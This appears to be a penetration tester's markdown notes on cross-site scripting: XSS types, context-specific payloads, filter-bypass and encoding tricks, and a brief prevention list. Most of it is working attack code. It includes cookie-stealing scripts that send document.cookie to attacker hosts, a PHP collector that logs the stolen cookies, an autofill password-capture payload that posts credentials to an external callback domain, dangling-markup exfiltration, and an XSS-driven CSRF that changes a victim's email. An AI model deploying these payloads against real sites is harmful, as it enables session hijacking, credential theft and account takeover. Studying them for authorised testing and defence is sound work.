>[!abstract]
>It is a vulnerability caused by the **insertion of the user's input inside the web page without that it hash been sanitized**.
>Dangerous special characters are: `< > ' " { } ;`

Different types of XSS:

- **Reflected**: The attack is only temporary for the request made. The vulnerable field is reflected via a parameter within the URL

- **Stored**: XSS attack saves malicious content along with normal content on DB, so that every time that content is loaded, the attack is also executed (typical of blogs)

- **[DOM-based XSS](DOM-based%20vulnerabilities.md#DOM-based%20XSS)**: It occurs when the payload is executed by modifying the DOM (Document Object Model), thus allowing the modification of HTML and XML components. In this case the responsible for the vulnerability is the client language and not the server (as for the other two). It manifests itself when the dynamic page is programmed in JavaScript, so that server-side requests are not executed, and the data present on the screen depends on other data entered by hand or derived from query-strings. DOM based XSS can be both reflected as well as stored, and they usually derive from `eval()` or `innerHTML`.

- **Self XSS**: Self-XSS involves similar application behavior to regular reflected XSS, however it cannot be triggered in normal ways via a crafted URL or a cross-domain request. Instead, the vulnerability is only triggered if the victim themselves submits the XSS payload from their browser.

Possible attacks and risks:

- Theft of cookies and session tokens
- User Enumeration and Fingerprinting
- Redirecting to malicious sites or contents
- Keylogging
- Automation of actions

## Warning when choosing the right PoC

>[!warning]
>From version 92 onward (July 20th, 2021), cross-origin iframes are prevented from calling `alert()`. As these are used to construct some of the more advanced XSS attacks, you'll sometimes need to use an alternative PoC payload. In this scenario, we recommend the `print()` function. Further references at [alert() is dead, long live print()](https://portswigger.net/research/alert-is-dead-long-live-print) 

---

## Examples of attacks

>[!summary] Remember
>A key task is to always identify the XSS context:
>- The location within the response where attacker-controllable data appears.
>- Any input validation or other processing that is being performed on that data by the application.
>
> Based on these details, you can then select one or more candidate XSS payloads, and test whether they are effective.

Example of different context and respective useful payloads:
- XSS between HTML tags 
	- `<script>alert(document.domain)</script>`
	- `<img src=1 onerror=alert(1)>`
- XSS in HTML tag attributes
	- `"><script>alert(document.domain)</script>`
	- `" autofocus onfocus=alert(document.domain) x="` 
	- `<a href="javascript:alert(document.domain)">`
	- [XSS in hidden input fields](https://portswigger.net/research/xss-in-hidden-input-fields) ---> `%27accesskey=%27x%27onclick=%27alert(1)`
- XSS into JavaScript
	- `</script><img src=1 onerror=alert(document.domain)>`
	- `'-alert(document.domain)-'` or `';alert(document.domain)//`
- Making use of HTML-encoding
	- `&apos;-alert(document.domain)-&apos;`
- XSS in JavaScript template literals (eg. ``document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;``)
	- `${alert(document.domain)}`
- [Client-side template injection (CSTI)](Client-side%20template%20injection%20(CSTI).md)
	- [Client-side template injection in AngularJS](Client-side%20template%20injection%20(CSTI).md#Client-side%20template%20injection%20in%20AngularJS)


### Steal of cookies and session tokens

Payload:

```jsx
<script> new Image().src = "http://attacker.site/log.php?q="+document.cookie;</script>

<script>
alert(document.cookie);
var i=new Image;
i.src="http://192.168.0.18:8888/?"+document.cookie;
</script>

<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>

<script>var i=new Image;i.src="http://192.168.0.18:8888/?"+document.cookie;</script>

<img src=x onerror=this.src='http://192.168.0.18:8888/?'+document.cookie;>

<img src=x onerror="this.src='http://192.168.0.18:8888/?'+document.cookie; this.removeAttribute('onerror');">
```

Server:

```php
<?php
$filename = "/tmp/log.txt";
$fp = fopen($filename, 'a');

$cookie = $_GET['q'];
fwrite($fp, $cookie);
fclose($fp);
?>
```

### iframe redirection

Payload:

```jsx
<iframe src="192.168.1.55/malicious.js" height="0" width="0"></iframe>
```

### Dangling markup injection

>[!question] What is dangling markup injection?
>Dangling markup injection is a technique that can be used to capture data cross-domain in situations where a full cross-site scripting exploit is not possible, due to input filters or other defenses. Any attribute that makes an external request can be used for dangling markup.

Often used to capture sensitive information visible to users, like:
- CSRF token
- API keys
- Secrets
- Email messages

>[!example]
>Application code injecting user-supplied data inside the `value` field: `<input type="text" name="input" value="CONTROLLABLE DATA HERE`
>In case there is WAF or something preventing XSS, attacker can exfiltrate data using a payload like `"><img src='//attacker-website.com?`
>
>This payload creates an `img` tag and defines the start of a `src` attribute containing a URL on the attacker's server. Note that the attacker's payload doesn't close the `src` attribute, which is left "dangling". When a browser parses the response, it will look ahead until it encounters a single quotation mark to terminate the attribute. Everything up until that character will be treated as being part of the URL and will be sent to the attacker's server within the URL query string. Any non-alphanumeric characters, including newlines, will be URL-encoded.


### Capture passwords exploiting auto-fill

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://uusx5ulcqjyd4ypy5x9hhjhoffl89zxo.oastify.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

Related article: [Stealing passwords from infosec Mastodon - without bypassing CSP](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp)

### Exploiting XSS to perform CSRF

>[!tip]
>See also [Cross-Site Request Forgery (CSRF)](Session%20Attacks%20(CSRF,%20session%20stealing,%20etc.).md#Cross-Site%20Request%20Forgery%20(CSRF))

The payload first extract the CSRF token from the "change email" function, then perform the CSRF attack:
```html
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

---

## XSS Filtering bypass

```html
<script>alert("Hacked!")</script>                                   <!-- Classic payload -->  
<ScRiPt>alert("Hacked!")</ScRiPt>                                   <!-- Case insensitive bypass -->
<sc<script>ript>alert("XSS");</scr</script>ipt>                     <!-- word control bypass -->
<script type="text/javascript">alert(document.cookie)</script>      <!-- legacy syntax bypass -->
<svg onload="alert(document.cookie)">                               <!-- JS from HTML bypass -->
<img src=x onerror=alert(1337)>                                     <!-- JS on error when loading a non existing image -->

<!-- Obfuscation -->
<img src=x onerror="&#x61;lert(1)">                                 <!-- Obfuscation via HTML encoding -->
<a href="javascript&#00000000000058;alert(1)">Click me</a>          <!-- Obfuscation via leading zeros in HTML encodings (deciaml and hex) -->
<a href="javascript:\u0061lert(1)">Click me</a>                     <!-- Obfuscation via Unicode encoding -->
<a href="javascript:\u{0000000003a}alert(1)">Click me</a>           <!-- Obfuscation via leading zeros in unicode encoding -->
<a href="javascript:\x61lert">Click me</a>                          <!-- Obfuscation via HEX encoding -->
<a href="javascript:\141lert">Click me</a>                          <!-- Obfuscation via Octal encoding -->
<a href="javascript:&bsol;u0061lert(1)">Click me</a>                <!-- Obfuscation via multiple layer of encodings (HTML, Unicode) -->

<!-- XSS without parentheses and semi-colons -->
onerror=alert;throw 1                                               
postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

Extensive cheat sheets can be found at:

- [[Evading Restrictions.md]]
- [Cross-Site Scripting (XSS) Cheat Sheet - 2022 Edition | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [Obfuscating attacks using encodings](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings)
- [XSS without parentheses and semi-colons](https://portswigger.net/research/xss-without-parentheses-and-semi-colons)
- `eval(atob("base64"))`
	- [eXtra Safe Security layers](../../Play%20ground/CTFs/eXtra%20Safe%20Security%20layers.md)
	- [Mutation Lab](../../Play%20ground/CTFs/Mutation%20Lab.md)

## XSS Prevention [^1]

- **Filter input on arrival**
- **Encode data on output**
- **Use appropriate response headers**
- [Content Security Policy (CSP)](Content%20Security%20Policy%20(CSP).md)

[^1]: https://portswigger.net/web-security/cross-site-scripting/preventing

---

## Tools for XXS

- BeEF
- DOM Invader